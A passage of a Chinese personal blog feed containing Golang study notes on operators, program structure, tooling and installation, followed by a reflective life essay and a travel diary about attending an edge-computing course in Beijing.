%s：输出字符串表示（string类型或[]byte) %q：双引号围绕的字符串，由Go语法安全地转义 %x：十六进制，小写字母，每字节两个字符 %X：十六进制，大写字母，每字节两个字符 指针 %p：十六进制表示，前缀 0x 复合数据类型 Go 语言中的复合数据类型以下几种，将在后续博客中详细介绍。 值类型：array、struct 引用类型：slice、map、chan 接口类型：interface JSON、文本等 算术运算符 常见可用于整数和浮点数的二元运算符有 +、-、* 和 /。对于整数运算而言，结果依旧为整数： 19 / 4 -&gt; 2 取余运算符 % 只能作用于整数： 19 % 4 -&gt; 1 可以将语句 b = b + a 简写为 b+=a，同样的写法也可用于 -=、*=、/=、%=。对于整数和浮点数，也可以使用一元运算符 ++（递增）和 --（递减），但只能用于后缀。并且，带有 ++ 和 -- 的只能作为语句，而非表达式。 12i++ -&gt; i += 1 -&gt; i = i + 1n := i++ // 无效 逻辑运算符 Go 中拥有以下逻辑运算符：==、!=、&lt;、&lt;=、&gt;、&gt;=。它们之所以被称为逻辑运算符是因为它们的运算结果总是为布尔值 bool。 110 &gt; 5 -&gt; true 位运算符 位运算只能用于整数类型的变量，且需当它们拥有等长位模式时。 按位与 &amp; 12341 &amp; 1 -&gt; 11 &amp; 0 -&gt; 00 &amp; 1 -&gt; 00 &amp; 0 -&gt; 0 按位或 | 12341 | 1 -&gt; 11 | 0 -&gt; 10 | 1 -&gt; 10 | 0 -&gt; 0 按位异或 ^ 12341 ^ 1 -&gt; 01 ^ 0 -&gt; 10 ^ 1 -&gt; 10 ^ 0 -&gt; 0 按位置零 &amp;^：将运算符左边数据相异的位保留，相同位清零。 12340 &amp;^ 0 -&gt; 00 &amp;^ 1 -&gt; 01 &amp;^ 0 -&gt; 11 &amp;^ 1 -&gt; 0 按位补足 ^运算符与异或运算符一同使用 12^1 -&gt; 0 // 作为一元运算符，即按位取反1 ^ 0 -&gt; 1 // 作为二元运算符，即按位异或 位左移 &lt;&lt; ，向左移动 n 位，右侧空白部分使用 0 填充 1231 &lt;&lt; 10 // 等于 1 KB1 &lt;&lt; 20 // 等于 1 MB1 &lt;&lt; 30 // 等于 1 GB 位右移 &gt;&gt;，向右移动 n 位，左侧空白部分使用 0 填充 11 &gt;&gt; 2 -&gt; 001 // 二进制 优先级 有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低： 12345678优先级 运算符 7 ^ ! 6 * / % &lt;&lt; &gt;&gt; &amp; &amp;^ 5 + - | ^ 4 == != &lt; &lt;= &gt;= &gt; 3 &lt;- 2 &amp;&amp; 1 ||]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-基本结构]]></title>
    <url>%2F2018%2F08%2F21%2FGolang%E7%AC%94%E8%AE%B0-%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[Golang 程序基本结构学习。 程序一般由关键字、常量、变量、运算符、类型和函数组成。程序中可能会使用到这些分隔符：括号 ()，中括号 [] 和大括号 {}。程序中可能会使用到这些标点符号：.、,、;、: 和 …。程序的代码通过语句来实现结构化。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。 标识符 有效的标识符必须以字符（可以使用任何 UTF-8 编码的字符或 _）开头，然后紧跟着 0 个或多个字符或 Unicode 数字。 _ 是一个特殊的标识符，被称为空白标识符。它可以像其他标识符那样用于变量的声明或赋值（任何类型都可以赋值给它），但任何赋给这个标识符的值都将被抛弃，因此这些值不能在后续的代码中使用，也不可以使用这个标识符作为变量对其它变量进行赋值或运算。 关键字Go 语言中定义的25个关键字： break default func interface select case defer go map struct chan else goto package switch const fallthrough if range type continue for import return var 分类整理： 基本结构 变量、常量：var const 包管理：package import 基本组件 函数：func return 自定义类型：interface struct type 引用类型：map range 流程控制 并发：go select chan 单分支流程：if else 多分支流程：switch case default fallthrough 循环流程：for break continue goto defer 基本结构Go 语言版 hello world ： 1234567package mainimport "fmt"func main() &#123; fmt.Println("hello, world")&#125; 包 包是结构化代码的一种方式：每个程序都由包的概念组成，可以使用自身的包或者从其它包中导入内容。如同其它一些编程语言中的类库或命名空间的概念，每个 Go 文件都属于且仅属于一个包。一个包可以由许多以 .go 为扩展名的源文件组成，因此文件名和包名一般来说都是不相同的。 如上，在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。 一个应用程序可以包含不同的包，而且即使你只使用 main 包也不必把所有的代码都写在一个巨大的文件里：你可以用一些较小的文件，并且在每个文件非注释的第一行都使用 package main 来指明这些文件都属于 main 包。另外要注意的是，所有的包名都应该使用小写字母。 一个 Go 程序是通过 import 关键字将一组包链接在一起。import &quot;fmt&quot; 告诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数。包名被封闭在半角双引号 &quot;&quot; 中。如果你打算从已编译的包中导入并加载公开声明的方法，不需要插入已编译包的源代码。 如果需要多个包，它们可以被分别导入： 12import "fmt"import "os" 或（该方式被称为因式分解关键字，同样适用于 const、var 和 type 的声明或定义）： 1234import ( "fmt" "os") 如果你导入了一个包却没有使用它，则会在构建程序时引发错误，如 imported and not used: os，这正是遵循了 Go 的格言：“没有不必要的代码！“。 包也可以作为命名空间使用，帮助避免命名冲突（名称冲突）：两个包中的同名变量的区别在于他们的包名，例如 pack1.Thing 和 pack2.Thing。另外，可以通过使用包的别名来解决包名之间的名称冲突，或者说根据你的个人喜好对包名进行重新设置，如：import fm &quot;fmt&quot;。 函数 main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。如果你的 main 包的源代码没有包含 main 函数，则会引发构建错误 undefined: main.main。main 函数既没有参数，也没有返回类型。 函数里的代码（函数体）使用大括号 {} 括起来。左大括号 { 必须与方法的声明放在同一行，这是编译器的强制规定。对于大括号 {} 的使用规则在任何时候都是相同的（如：if 语句等）。 只有当某个函数需要被外部包调用的时候才使用大写字母开头，并遵循 Pascal 命名法；否则就遵循骆驼命名法，即第一个单词的首字母小写，其余单词的首字母大写。 如上，fmt.Println(&quot;hello, world&quot;) 调用了 fmt 包中的 Println 函数，可以将字符串输出到控制台，并在最后自动增加换行字符 \n 。 Go 程序基本思路 在完成包的 import 之后，开始对常量、变量和类型的定义或声明。 如果存在 init 函数的话，则对该函数进行定义（这是一个特殊的函数，每个含有该函数的包都会首先执行这个函数）。 如果当前包是 main 包，则定义 main 函数。 然后定义其余的函数，首先是类型的方法，接着是按照 main 函数中先后调用的顺序来定义相关函数，如果有很多函数，则可以按照字母顺序来进行排序。 Go 程序执行顺序 按顺序导入所有被 main 包引用的其它包，然后在每个包中执行如下流程： 如果该包又导入了其它的包，则从第一步开始递归执行，但是每个包只会被导入一次。 然后以相反的顺序在每个包中初始化常量和变量，如果该包含有 init 函数的话，则调用该函数。 在完成这一切之后，main 也执行同样的过程，最后调用 main 函数开始执行程序。 命名规范与可见性规则 Go 语言中对象的命名也应该是简洁且有意义的。名称不需要指出自己所属的包，因为在调用的时候会使用包名作为限定符。返回某个对象的函数或方法的名称一般都是使用名词，没有 Get... 之类的字符，如果是用于修改某个对象，则使用 SetName。有必须要的话可以使用大小写混合的方式，如 MixedCaps 或 mixedCaps，而不是使用下划线来分割多个名称。 当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public ）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 private ）。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-开发工具]]></title>
    <url>%2F2018%2F08%2F20%2FGolang%E7%AC%94%E8%AE%B0-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Golang 开发工具介绍。 编辑器与IDE Sublime Text 是一个革命性的跨平台（Linux、Mac OS X、Windows）文本编辑器，它支持编写非常多的编程语言代码。对于 Go 而言，它有一个插件叫做 GoSublime 来支持代码补全和代码模版。 LiteIDE 这是一款专门针对 Go 开发的集成开发环境，在编辑、编译和运行 Go 程序和项目方面都有非常好的支持。同时还包括了对源代码的抽象语法树视图和一些内置工具（由国人 vfc 大叔开发）。 GoClipse 是一款 Eclipse IDE 的插件，拥有非常多的特性以及通过 GoCode 来实现代码补全功能。 Goland 是 Jetbrains 开发的 Go IDE，号称 A Clever IDE to Go ，提供代码辅助、代码编辑器、插件生态系统以及各种集成工具，功能十分完善（推荐！！！）。 常用工具go get 工具 go get 命令主要是用来动态获取远程代码包的，目前支持的有BitBucket、GitHub、Google Code和Launchpad。这个命令在内部实际上分成了两步操作：第一步是下载源码包，第二步是执行go install。 go get 命令本质上可以理解为：首先通过源码工具clone代码到src目录，然后执行go install。 go build 工具 go build 命令主要是用于测试编译。在包的编译过程中，若有必要，会同时编译与之相关联的包。 如果是普通包，当你执行 go build 命令后，不会产生任何文件。 如果是 main 包，当只执行 go build 命令后，会在当前目录下生成一个可执行文件。 go install 工具 go install 是安装 Go 包的工具，主要用于安装非标准库的包文件，将源代码编译成对象文件。 这个命令在内部实际上分成了两步操作：第一步是生成结果文件(可执行文件或者.a包)，第二步会把编译好的结果移到$GOPATH/pkg或者$GOPATH/bin。 与 go build 命令对比： go install go build 生成的可执行文件路径 工作目录下的 bin 目录下 当前目录下 可执行文件的名字 与源码所在目录同名 默认与源程序同名，可以使用 -o 选项指定 依赖 将依赖的包放到工作目录下的 pkg 文件夹下 —— go fmt 工具 Go 开发团队不想要 Go 语言像许多其它语言那样总是在为代码风格而引发无休止的争论，浪费大量宝贵的开发时间，因此他们制作了一个工具：go fmt（gofmt）。 go fmt 工具可以将你的源代码格式化成符合官方统一标准的风格，属于语法风格层面上的小型重构。遵循统一的代码风格是 Go 开发中无可撼动的铁律，因此你必须在编译或提交版本管理系统之前使用 gofmt 来格式化你的代码。LiteIDE 和 Goland中都已经集成该工具，保存文件时会自动进行格式化。 另外，在 Go 语言中注释代码的方式有： // ：单行注释 / /：多行注释 go doc 工具 go doc 工具会从 Go 程序和包文件中提取顶级声明的首行注释以及每个对象的相关注释，并生成相关文档。这个工具只能获取在 Go 安装目录下 ../go/src 中的注释内容。 123go doc package 获取包的文档注释go doc package/subpackage 获取子包的文档注释go doc package function 获取某个函数在某个包中的文档注释 此外，go doc 还可以作为一个本地在线文档浏览 web 服务器。在命令行输入 godoc -http=:8080，然后使用浏览器打开 http://localhost:8080 后，你就可以看到本地文档浏览服务器提供的页面。 其它工具 go run：直接运行程序。 go test：是一个轻量级的单元测试框架。 go clean：用来移除当前源码包和关联源码包里面编译生成的文件。 go fix：用于将你的 Go 代码从旧的发行版迁移到最新的发行版，它主要负责简单的、重复的、枯燥无味的修改工作，如果像 API 等复杂的函数修改，工具则会给出文件名和代码行数的提示以便让开发人员快速定位并升级代码。Go 开发团队一般也使用这个工具升级 Go 内置工具以及 谷歌内部项目的代码。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-安装]]></title>
    <url>%2F2018%2F08%2F19%2FGolang%E7%AC%94%E8%AE%B0-%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Golang 安装与环境配置介绍。 Golang 编译器 Golang 目前有2个版本的编译器：Go 原生编译器 gc 和非原生编译器 gccgo，这两款编译器都是在类 Unix 系统下工作 。其中，gc 版本的编译器已经被移植到 Windows 平台上，并集成在主要发行版中，你也可以通过安装 MinGW 从而在 Windows 平台下使用 gcc 编译器。 对于非常底层的纯 Go 语言代码或者包而言，在各个操作系统平台上的可移植性是非常强的，只需要将源码拷贝到相应平台上进行编译即可，或者可以使用交叉编译来构建目标平台的应用程序。 Golang 安装 支持 Linux、Windows 和 Mac OS 上的安装，可参考下面的教程根据自己的需要进行安装： 官方安装教程：https://golang.org/doc/install （需要翻墙） 菜鸟教程Go语言环境安装：http://www.runoob.com/go/go-environment.html Golang 环境变量 通过 go env 命令可以查看 Go 语言的环境信息。 其中， $GOROOT 表示 Go 在你的电脑上的安装位置，它的值一般都是 $HOME/go，当然，你也可以安装在别的地方。 $GOARCH 表示目标机器的处理器架构，它的值可以是 386、amd64 或 arm。 $GOOS 表示目标机器的操作系统，它的值可以是 darwin、freebsd、linux 或 windows。 $GOBIN 表示编译器和链接器的安装位置，默认是 $GOROOT/bin，如果你使用的是 Go 1.0.3 及以后的版本，一般情况下你可以将它的值设置为空，Go 将会使用前面提到的默认值。 目标机器是指你打算运行你的 Go 应用程序的机器。Go 编译器支持交叉编译，也就是说你可以在一台机器上构建运行在具有不同操作系统和处理器架构上运行的应用程序，也就是说编写源代码的机器可以和目标机器有完全不同的特性（操作系统与处理器架构）。 为了区分本地机器和目标机器，你可以使用 $GOHOSTOS 和 $GOHOSTARCH 设置本地机器的操作系统名称和编译体系结构，这两个变量只有在进行交叉编译的时候才会用到，如果你不进行显示设置，他们的值会和本地机器（$GOOS 和 $GOARCH）一样。 $GOPATH 默认采用和 $GOROOT 一样的值，但从 Go 1.1 版本开始，你必须修改为其它路径。它可以包含多个包含 Go 语言源码文件、包文件和可执行文件的路径，而这些路径下又必须分别包含三个规定的目录：src、pkg 和 bin，这三个目录分别用于存放源码文件、包文件和可执行文件。 $GOARM 专门针对基于 arm 架构的处理器，它的值可以是 5 或 6，默认为 6。 $GOMAXPROCS 用于设置应用程序可使用的处理器个数与核数。 Golang 安装目录 Go 安装目录（$GOROOT）的文件夹结构应该如下所示： /bin：包含可执行文件，如：编译器，Go 工具 /doc：包含示例程序，代码工具，本地文档等 /lib：包含文档模版 /misc：包含与支持 Go 编辑器有关的配置文件以及 cgo 的示例 /os_arch：包含标准库的包的对象文件（.a） /src：包含源代码构建脚本和标准库的包的完整源代码（Go 是一门开源语言） /src/cmd：包含 Go 和 C 的编译器和命令行脚本 此外，还有README.md, AUTHORS, CONTRIBUTORS, LICENSE文件 Golang 工作空间 Go 的源代码必须存放在 workspace 中。 GOPATH环境变量 指明了你的工作空间的位置，该目录可以是任意的，唯一的要求是不能是你安装 Go 时的目录。workspace 是一个目录（directory hierachy），在这个目录下有三个子目录： src 包含 Go 源代码文件, 源代码文件组织成 packages (one package per directory) pkg 包含 package objects （二进制的包） bin 包含 可执行的命令 command（可执行的二进制文件） go tool 编译(build) 源代码文件(source packages)，并且将 resulting binaries 安装在 pkg 和 bin 目录下面。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang笔记-简介]]></title>
    <url>%2F2018%2F08%2F19%2FGolang%E7%AC%94%E8%AE%B0-%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Go 是一种非常高效的，支持并发 、垃圾回收的编译型开源系统编程语言，它能让构造简单、可靠且高效的软件变得容易。 Golang以前的logo是可爱的囊地鼠，生性懒散 ，Go特性之一是惰性求值（Lazy Evaluation），即延迟执行代码。 但是，Golang在2018年更换了如下的新logo，全新形象代表速度和效率： Golang的历史 C/C++ 的发展速度无法跟上计算机发展的脚步，十多年来也没有出现一门与时代相符的主流系统编程语言，因此人们需要一门新的系统编程语言来弥补这个空缺。在 Go 语言出现之前，开发者们总是面临非常艰难的抉择，究竟是使用执行速度快但是编译速度并不理想的语言（如：C++），还是使用编译速度较快但执行效率不佳的语言（如：.NET、Java），或者说开发难度较低但执行速度一般的动态语言呢？显然，Go 语言在这 3 个条件之间做到了最佳的平衡：快速编译，高效执行，易于开发。 Golang出生名门Google，介绍一下Golang的设计者： Robert Griesemer，参与开发 Java HotSpot 虚拟机； Rob Pike，Go 语言项目总负责人，贝尔实验室 Unix 团队成员，参与的项目包括 Plan 9，Inferno 操作系统和 Limbo 编程语言； Ken Thompson，贝尔实验室 Unix 团队成员，C 语言、Unix 和 Plan 9 的创始人之一，与 Rob Pike 共同开发了 UTF-8 字符集规范。 2007年，受够了C++煎熬的Google首席软件工程师Rob Pike纠集Robert Griesemer和Ken Thompson两位牛人，决定创造一种新语言来取代C++，这就是Golang。出现在21世纪的GO语言，虽然不能如愿对C++取而代之，但是其近C的执行性能和近解析型语言的开发效率以及近乎于完美的编译速度，已经风靡全球。 在 2009 年 10 月 30 日，Rob Pike 以 Google Techtalk 的形式第一次向人们宣告了 Go 语言的存在。直到 2009 年 11 月 10 日，开发团队将 Go 语言项目以 BSD-style 授权（完全开源）正式公布了 Linux 和 Mac OS X 平台上的版本。 Golang的优点 天生支持高并发。Goroutines 是 Go 面向线程的轻量级方法，而channel是 goroutines 之间通信的优先方式。Goroutine 和 channel 使得编写高并发的服务端软件变得相当容易，很多情况下完全不需要考虑锁机制以及由此带来的各种问题。单个 Go 应用也能有效的利用多个 CPU 核，并行执行的性能好。 编译速度快。编译时间用秒计算，相较于 Java 和 C++呆滞的编译速度，Go 的快速编译时间是一个主要的效率优势。 部署简单。Go 编译生成的是一个静态可执行文件，除了 glibc 外没有其他外部依赖。这让部署变得异常方便：目标机器上只需要一个基础的系统和必要的管理、监控工具，完全不需要操心应用所需的各种包、库的依赖关系，大大减轻了维护的负担。 开发效率。 GO语言使用起来简单、代码描述效率高、编码规范统一、上手快。通过少量的代码，即可实现框架的标准化，并以统一的规范快速构建API业务逻辑。能快速的构建各种通用组件和公共类库，进一步提升开发效率，实现特定场景下的功能量产。 执行性能好。Go 极其快，其性能与 Java 或 C++相似，Go 一般比 Python 要快 30 倍。 高效的垃圾回收机制。Go 拥有简单却高效的标记-清除回收器。它的主要思想来源于 IBM 的可复用垃圾回收器，旨在打造一个高效、低延迟的并发回收器。当然，使用一门具有垃圾回收功能的编程语言不代表你可以避免内存分配所带来的问题，分配和回收内容都是消耗 CPU 资源的一种行为。 …… Golang的适用场景 服务器编程，以前你如果使用C或者C++做的那些事情，用Go来做很合适，例如处理日志、数据打包、虚拟机处理、文件系统等。 分布式系统，数据库代理器等。 网络编程，包括Web应用、API应用、微服务等。 云平台，目前国外很多云平台在采用Go开发。 …… Golang的应用案例 Docker，基于Go语言的开源应用容器引擎。 kubernetes，Google 团队发起并维护的基于 Docker 的开源容器集群管理系统，它不仅支持常见的云平台，而且支持内部数据中心。 Docker Swarm，Docker官方提供的一款集群管理工具，其主要作用是把若干台Docker主机抽象为一个整体，并且通过一个入口统一管理这些Docker主机上的各种Docker资源。 Youtube，全球最大视频网站 七牛云存储，国内领先的企业级公有云服务商，致力于打造以数据为核心的场景化PaaS服务。 ……]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开始懂了]]></title>
    <url>%2F2018%2F08%2F19%2F%E5%BC%80%E5%A7%8B%E6%87%82%E4%BA%86%2F</url>
    <content type="text"><![CDATA[因为我没有期望，所以我也不再失望了。 近来的一点点生活感悟： 后来才明白，这么多年，妄图改变别人，做了那么多费力不讨好的事情，最后伤害的都是自己。人和人终究是不一样的，或许做好自己才是这个年纪最应该做的事吧。 听了再多的故事，学了再多的道理，也不及经历过一些事情来得实在。只有那些刻骨铭心的经历才能让自己的内心真正强大，所以能够有所经历、有所感悟，也是弥足珍贵的。 一次次见证没有计划带来的致命后果，也深知一次次的没有计划最终足够摧毁一个人，但还是很难去改变一些已经根深蒂固的东西。我想，合理的计划，谨慎地执行，及时的调整，离成功也就不远了。 最廉价的爱情，无非是迷失了自我，一味的妥协与讨好。其实，无论是友情亲情爱情，真正好的关系是不必讨好的。我们最爱的始终还应该是自己，至于最后能不能走下去，真的，看缘分。 要做到察言观色确实会很累，但是，时刻只顾及自己，又会显得十分天真，就像小孩一样。有时候会想，活着本来就很累了，要做那么多自己并不喜欢的选择，何必再去考虑别人的感受。当然，你也可以选择最舒服的方式活着，但是，不要忘了，你的世界不可能始终一个人。一个真正成熟的人不会轻易不顾别人的感受做一些事情。 能够互相见证成长应该是一件很棒的事情了吧。当我们经历人生的起起伏伏，彼此的祝福与鼓励都会让我们对未来充满希望。有时候觉得，这样的感情好纯粹，互相之间无比信任，无需计较太多，也不会害怕失去。感谢生命有你参与，愿你我情谊常存。 因为我没有期望，所以我也不再失望了。真正希望你进步的人才会对你有所期望，而失望并不可怕，可怕的是不再对你有所期望。所以，要合理看待失望，而不是害怕失望。我想，及时反思，尽力付出，才是让自己进步的方法。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[北京，再会]]></title>
    <url>%2F2018%2F08%2F08%2F%E5%8C%97%E4%BA%AC%EF%BC%8C%E5%86%8D%E4%BC%9A%2F</url>
    <content type="text"><![CDATA[2015年由于参加比赛匆匆到过北京，今年7月中旬再次来到北京。三年多过去，再次来到北京，不出所料，还是有很多不一样的感受。毕竟，在这三年里，北京又经历了快速的发展，而自己也经历过很多的事情，也增长了很多的见识。曾经的井底之蛙，面对帝都的一切都充满了敬意，现如今已不再像第一次那样懵懂，更多的是面对这些不一样所引发的深层思考。 学学想想 很荣幸能够参加这次在中科院计算所举办的龙星计划边缘计算课程。关于边缘计算这个领域，自己也是在今年年初才开始了解的，研读了一些基本的论文以及施老师出版的教材，然后在今年5月份我们实验室有幸邀请到施老师来给大家做学术报告，后续也针对边缘计算进行了系统调研。这次课程让我们进一步系统地了解了边缘计算的相关知识，也认识了国内在这个领域做研究的朋友们。 边缘计算 先说说边缘计算的定义以及它的优势，边缘计算（edge computing）作为一种新的计算模式，使数据在源头附近就能得到及时有效的处理，满足实时性、降低带宽和隐私保护等需求。与传统的云计算模式相比，边缘计算模式不单在靠近数据中心的节点上进行处理，而且还能绕过网络带宽与延迟的瓶颈，在数据传输过程中的每一个节点上执行数据处理。随着物联网和大数据时代的到来，这种带宽和延迟的优化显得尤其重要。因此，边缘计算不仅得到了学术界的广泛认可，相关的论文层出不穷，还获得了产业界的青睐，华为、阿里、百度、腾讯等大公司都对边缘计算十分感兴趣。在这五天的课程里，施老师给我们讲的第一课就是如何成为一个科学家，从一个成功的科学家的心路历程开始讲起，到方法论，再到对我们的美好祝愿。最让我觉得认同的是他对于科研的一些理解，科研不仅仅是为了论文，而应该是解决实际问题的副产品，不应该像某些只注重论文成果的科研人员，纯粹变成论文机器。同时，施老师也为我们精心准备了边缘计算的课程内容，从边缘计算的愿景、应用场景、挑战、现有的系统以及安全与隐私保护五个方面进行了详细的讲解。此外，他还邀请了寒武纪、中移物联网、百度的三位嘉宾与我们分享他们在边缘计算方面的一些工作与思考。 寒武纪 对于寒武纪，我以前并不太了解，其实，它是一家做智能芯片的公司，世界首款商用深度学习专用处理器。它被誉为“全球首款AI芯片”华为麒麟970的幕后功臣“。因为寒武纪的产品已经被集成到华为的麒麟芯片中，并且运用到华为P20等实际的产品中，使得语音识别、人脸识别等机器学习技术在移动终端上得到更好的应用。去年，成立一年多的寒武纪完成1亿美元A轮融资，阿里、联想等巨头等都有投资，可以说外界对其十分看好。 给我们做报告的是寒武纪的陈云霁研究员，他和弟弟陈天石都是中科院计算所的研究员，都来自中科大少年班，充满着传奇色彩。陈云霁研究员的研究方向是芯片，而弟弟陈天石主要是做人工智能，兄弟俩当年思考未来科技发展的方向时，很自然地就决定结合起来做人工智能芯片。他们就是我佩服的研究人员，从实际出发，为了国家的科技进步，不仅发表了很多顶级会议的论文，并且引起了国际学术界的关注。同时，从科研到再到创办实际的公司，想必他们也付出了很多。由于陈研究员很忙，短短20分钟的报告，大致向我们介绍了他们的一些工作，以及他们对于人工智能芯片对边缘计算的意义。边缘计算在一定程度上就是解决机器学习算法在云端运行存在的问题，因为每次都需要将数据传送到云端，以图像识别为例，如果每次都上传到云端，会带来巨大的带宽消耗。有了机器学习芯片的支持，就可以更好的在终端运行机器学习算法，实现云端训练模型，然后在终端运行的目标。 中移物联网和百度 中移物联网是我本科期间就接触过的公司，使用过他们的OneNET物联网云平，也申请过他们的麒麟座开发板（虽然并没有好好地使用过，惭愧啊！），对于他们公司的产品也还算比较了解。中移物联网数字化产品部的吴经理在给我们的远程报告中介绍了他们公司的一些产品，主要集中在智能家居和车联网场景，以及他们认为的边缘计算的可能需求，主要介绍了智能家居、车联网和智能网关三个案例中采用边缘计算的设想。后来，百度的吴经理也给我们介绍了百度边缘计算的思考，他提到AI走向边缘计算的必然性，需要应对AI应有的时延要求、应对网络阻塞问题、分布式计算能力的获取，数据安全与隐私。大家都知道百度一直号称是AI公司，一直主推All in AI，但是AI训练和AI推理具有不同的特点和要求，AI训练需要庞大算力和数据 ，那么集中就成为必然，而AI推理涉及用户体验，需要快速响应，即推理服务请求应该随时服务，不应该也不能等待。这就使得云计算与边缘计算结合成为可能，这也可以在一定程度上促进AI的发展。核心云计算进行AI训练，边缘计算进行AI推理，这 将成为AI发展的一个方向。由于这两家公司与我们的研究十分相关，所以后续我们还会与他们有详细的交流，有机会再写博客分享。 思考 这次到北京的主要目的是学习交流，由于时间有限，虽然没有学到太多的干货，但是这次的课程也确实让我增长了见识，扩宽了自己的科研视野，也使我对边缘计算领域有了更深入更全面的认识。在中科院，见识了什么是真正的科研。感慨在学校里，部分老师只为了发论文评职称评，很多东西都很虚。可惜的是，当前的制度就是论文和成果为王，这其实也很影响真正做科研的人。所以，我现在也依然很迷茫，不知道未来的路在哪里。仔细思考当前研究界和产业界对边缘计算这个领域的关注度，按照边缘计算目前火热的趋势，我觉得还是有很多的机会，如果潜心做下去，一定大有可为。 走走看看 再次去到天安门，相比第一次来时的激动与敬仰之情，这一次，内心略显平淡。但是，走在人来人往的长安街，依然还是感到骄傲！作为一名共产党员，我本来想去看天安门广场看一次升国旗仪式，但是听了朋友讲述的经历，突然觉得没有太大必要了。为了看升旗，很早就要去排队，晚上基本不能睡觉，这样的事我应该是不会做的。不过，说不定，以后会有特别想去看的时候。第一次去北京的时候并没有去故宫。今年年初，经朋友推荐，看了故宫博物院单霁翔院长的演讲，哇，一位隐藏的段子手，瞬间被圈粉了。所以，这次去北京就早早地计划要去故宫看看。大殿内的金碧辉煌，仿佛在诉说着明清王朝的昔日盛世。昔日的皇家圣地，也成了今日的旅游胜地，仿佛在诉说着明清王朝的衰败。 回忆起看过的《明朝那些事儿》，感慨朱棣迁都北京的壮举，留下了这么壮观的紫禁城。登景山公园，俯瞰故宫紫禁城全景。遥望这大大小小的宫殿，感觉确实非同一般。站在景山公园最高建筑“万春亭”，登高远眺，故宫全景尽收眼底。不论从哪个角度看，故宫规模宏大、辉煌大气，给人以强烈的视觉震撼！ 在国家博物馆，感受博大精深的中华文化。由于对古代中国的历史并不是特别清楚，对于青铜器等历史文物等也不是很感兴趣，所以印象比较深刻的是《复兴之路》基本陈列。复兴之路基本陈列总共分为五个大部分，第一部分，中国沦为半殖民地半封建社会；第二部分，探索救亡图存的道路；第三部分，中国共产党肩负起民族独立、人民解放的历史重任；第四部分，建设社会主义新中国；第五部分，走中国特色社会主义道路。它展示了我们中华民族从鸦片战争以来一百多年团结奋斗、自强不息的历史，展现了中华民族不屈不挠英勇抗争、在中国共产党领导下寻路奋斗求解放、艰辛探索搞建设、改革开放谋发展走中国特色社会主义强国之路的壮丽史诗和宏篇巨著。 回顾这段复兴之路，多少英雄为此付出了生命，多少伟大的人为国家的发展。但是，再看看现如今中国式悲哀频频上演，明星家事天下知，英雄事迹鲜有闻。泛娱乐化的时代，明星的八卦被炒得沸沸扬扬，而为国家发展默默奉献的科学家、军人、工人等等却很少得到该有的关注和尊重。我们今天安定富足的生活来之不易，没有革命军人的流血牺牲哪来的和平？没有科学家孜孜不倦的科研和发明哪来的高科技？没有农民和工人的辛勤劳作哪来的丰衣足食和住行舒适？不否认，明星给我们的业余生活增添了乐趣，但社会的发展不是他们演两部戏唱两首歌就能进步的。虽然我们无法左右周围人的价值观，也无法改变这个社会，但我们可以传递正能量。回顾中华民族的屈辱历史，再感受今天中国的伟大成就，以及展望可以预见的美好未来。我们应该牢记历史，不忘初心，怀揣梦想，并为之努力奋斗，这个国家才能越来越好。 见见聊聊 在开课前两天到达北京，去见了老友，他们一起陪我玩了两天。一起去故宫，去国博，去天安门，一起看电影，一起撸串，一起在中传的操场畅谈人生。很幸运，能有这样一群朋友陪着我在帝都吃吃喝喝、聊聊逛逛。毕业后，不同的人选择了不同的方向，一年以后，我发现大家关心的话题开始有了变化。工作的开始担心房子、房贷的问题，读研的开始准备找工作，或者说继续深造。各有各的烦恼，各有各的开心，北漂的艰难，不一样的生活节奏，在帝都成长的喜悦，所接触的人事物，都让我觉得有些遥不可及。另外，工作的羡慕读书的时间自由，读书的羡慕工作的财富自由。很多时候，我们就在这样的羡慕中做着各自的努力，直到有一天，我们的生活慢慢有更多的共同话题，于是我们也都长大了。 